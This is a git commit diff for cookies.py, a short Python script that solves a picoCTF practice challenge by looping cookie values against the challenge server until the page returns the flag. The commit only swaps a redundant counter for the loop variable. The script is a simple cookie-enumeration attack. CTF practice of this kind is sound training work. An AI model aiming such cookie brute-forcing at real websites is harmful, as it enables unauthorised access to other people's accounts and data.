abb10df8531a86d96c7f82e951aad8ff7b748c86
BLAINE777 <74994823+BORNY444@users.noreply.github.com>
2021-09-25 21:01:06 -0400

    Update cookies.py

--- cookies.py
+++ cookies.py
@@ -3,21 +3,19 @@ import requests
 
 url ="http://mercury.picoctf.net:29649/check" # change my url with yours
 i = 0
-count = 0
 
 
 while i < 25 :
     i += 1
-    count += 1
     cookie = { "name" :str(i)}
     guess = requests.get(url , cookies=cookie)
     if "picoCTF{" in guess.text :
-        print(count)
+        print(i)
         print("flag found :")
         print(guess.text)
         break
     else :
-        print(count)
+        print(i)
         print("flag not found")
         
      
